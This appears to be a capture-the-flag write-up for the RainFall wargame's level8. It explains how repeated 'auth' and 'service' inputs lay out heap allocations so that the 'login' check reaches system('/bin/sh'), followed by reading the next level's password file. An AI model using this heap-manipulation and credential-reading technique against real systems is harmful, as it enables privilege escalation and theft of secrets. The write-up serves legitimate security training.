We can see on [dogbolt](https://dogbolt.org/), the program `level8` as cut in three part : <br>
`'auth '`, `service` and `login` and we are interested by `login` because there are the function system('/bin/sh')

We can notice, the condition for accessing to /bin/sh are the pointer auth + 0x20(BinaryNinja) are not null
and we can see also `'auth '` initialize auth

Testing the program we obtain :
```Shell
level8@RainFall:~$ ./level8 
> (nil), (nil) 
auth 
> 0x804a008, (nil) 
service
> 0x804a008, 0x804a018
login
Password:
> 0x804a008, 0x804a018
auth 
> 0x804a018, 0x804a018
service
> 0x804a018, 0x804a028
```
Here after each input the program print the auth pointer and the service pointer


Here we see that after each input of `service` or `auth` a new pointer is created after the previous ones with an increment of 0x10.
We start by initializing the auth pointer and then we input service 2 times to define *(auth + 0x20).
We should have `pointer, pointer+0x20`:
```Shell
level8@RainFall:~$ ./level8 
(nil), (nil) 
auth 
0x804a008, (nil) 
service
0x804a008, 0x804a018 
service
0x804a008, 0x804a028 
login
$
$ cat /home/user/level9/.pass
```